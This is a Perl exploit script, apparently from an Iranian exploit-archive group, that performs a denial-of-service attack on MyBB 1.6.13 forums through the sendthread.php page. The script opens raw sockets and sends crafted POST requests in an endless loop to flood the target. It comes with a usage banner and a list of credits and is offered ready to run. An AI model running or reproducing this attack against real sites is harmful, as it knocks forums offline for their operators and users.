Denial of Service Vulnerability In Mybb 1.6.13 and old version



#!/usr/bin/perl
#################################
#
#     @@@    @@@@@@@@@@@    @@@@@           @@@@@@@@@@            @@@  @@@@@@@
#     @@@    @@@@@@@@@@@    @@@  @@         @@@     @@            @@@  @@@@@@@@  
#     @@@    @@@            @@@    @@       @@@       @@          @@@  @@@  @@@  
#     @@@    @@@            @@@      @@     @@@     @@            @@@  @@@  @@@  
#     @@@    @@@@@@@@@@@    @@@       @     @@@@@@@@@@            @@@  @@@@@@
#     @@@    @@@@@@@@@@@    @@@     @@      @@@     @@            @@@  @@@@@@
#     @@@    @@@            @@@   @@        @@@       @@   @@@    @@@  @@@ @@@
#     @@@    @@@            @@@ @@          @@@     @@     @@@    @@@  @@@  @@@
#     @@@    @@@@@@@@@@@    @@@@@           @@@@@@@@@@     @@@    @@@  @@@   @@@
#
#####################################
#####################################
#
#         Iranian Exploit DataBase
#
# Mybb Sendthread Page Denial of Service Vulnerability
# Test on Mybb 1.6.13
# Vendor site : www.mybb.com
# Code Written By Amir - iedb.team () gmail com - o0_shabgard_0o () yahoo com
# Site : Www.IeDb.Ir/acc   -   Www.IrIsT.Ir
# Fb Page : https://www.facebook.com/iedb.ir
# Greats : Bl4ck M4n - ErfanMs - TaK.FaNaR  - N20 - Bl4ck N3T - dr.koderz - Enddo - E1.Coders - Behnam Vanda
# E2MA3N - l4tr0d3ctism - H-SK33PY - sole sad - r3d_s0urc3 - Dr_Evil - z3r0 - 0x0ptim0us - 0Day
# Security - ARTA - ARYABOD - Mr.Time - C0dex - Dj.TiniVini - Det3cT0r - yashar shahinzadeh
#  Khashayar - tootro20 - AmirMasoud And All Members In IeDb.Ir/acc
#####################################
use Socket;
if (@ARGV < 2) { &usage }
$rand=rand(10);
$host = $ARGV[0];
$dir = $ARGV[1];
$host =~ s/(http:\/\/)//eg;
for ($i=0; $i<10; $i--)
{
$data = 
"my_post_key=03b00s02454cec9a61c700b18ec7fd31&email=%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0&subject=%D8%B5%D9%81%D8%AD%D9%87+%D9%88%D8%A8+%D9%85%D9%88%D8%B1%D8%AF+%D8%B9%D9%84%D8%A7%D9%82%D9%87+%D8%AF%D8%B1+%D9%85%D8%A7%DB%8C+%D8%A8%DB%8C+%D8%A8%DB%8C+MyBB+%2C+%D9%BE%D9%84%D8%A7%DA%AF%DB%8C%D9%86+%2C+%D9%82%D8%A7%D9%84%D8%A8&message=%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0&action=do_sendtofriend&tid=50";
$len = length $data;
$foo = "POST ".$dir."sendthread.php HTTP/1.1\r\n".
"Accept: * /*\r\n".
"Accept-Language: en-gb\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Accept-Encoding: gzip, deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n".
"Host: $host\r\n".
"Content-Length: $len\r\n".
"Connection: Keep-Alive\r\n".
"Cache-Control: no-cache\r\n\r\n".
"$data";
my $port = "80";
my $proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
connect(SOCKET, sockaddr_in($port, inet_aton($host))) || redo;
send(SOCKET,"$foo", 0);
syswrite STDOUT, "+" ;
}
print "\n\n";
system('ping $host');
sub usage {
print "################################################# \n";
print "##       Mybb Sendthread Page Denial of Service Vulnerability\n";
print "## Discoverd By Amir - iedb.team () gmail com - Id : o0_shabgard_0o \n";
print "##      Www.IeDb.Ir/acc   -   Www.IrIsT.Ir \n";
print "################################################# \n";
print "## [host] [path] \n";
print "## http://host.com /mybb/\n";
print "################################################# \n";
exit();
};
#####################################
#  Archive Exploit = http://www.iedb.ir/exploits-1730.html
#####################################
